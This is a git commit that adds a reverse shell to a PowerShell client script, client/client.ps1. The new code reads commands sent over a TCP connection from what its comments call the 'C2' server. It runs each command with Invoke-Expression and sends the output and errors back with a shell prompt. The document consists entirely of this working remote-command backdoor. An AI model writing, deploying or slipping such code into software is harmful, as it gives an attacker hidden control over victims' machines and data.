f30a4cebde7b780335e6aa0815412bca28cce462
joyon2393 <joyonskyalker@gmail.com>
2024-05-10 17:38:12 +0300

    adding riverse shell

--- client/client.ps1
+++ client/client.ps1
@@ -13,21 +13,37 @@ $stream = $tcpClient.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
 $reader = New-Object System.IO.StreamReader($stream)
 
+
 # Receive commands from the server and execute them
-while ($true) {
-    # Receive command from server
-    $command = $reader.ReadLine()
-    if ([string]::IsNullOrEmpty($command)) {
-        break
-    }
+function WriteToStream ($String) {
+    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
+    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
 
-    # Execute the command and retrieve the output
-    $output = Invoke-Expression $command
-
-    # Send the output back to the server
-    $writer.WriteLine($output)
+    # Write to C2
+    $writer.Write($String + 'SHELL> ')
     $writer.Flush()
 }
+
+# Initial output to C2. The function also creates the inital empty byte array buffer used below.
+WriteToStream ''
+
+# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
+while(($BytesRead = $stream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
+    # Encode command, remove last byte/newline
+    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
+    
+    # Execute command and save output (including errors thrown)
+    $Output = try {
+            Invoke-Expression $Command 2>&1 | Out-String
+        } catch {
+            $_ | Out-String
+        }
+
+    # Write output to C2
+    WriteToStream ($Output)
+}
+
+$writer.Close()
 
 # Close the connection
 $stream.Close()
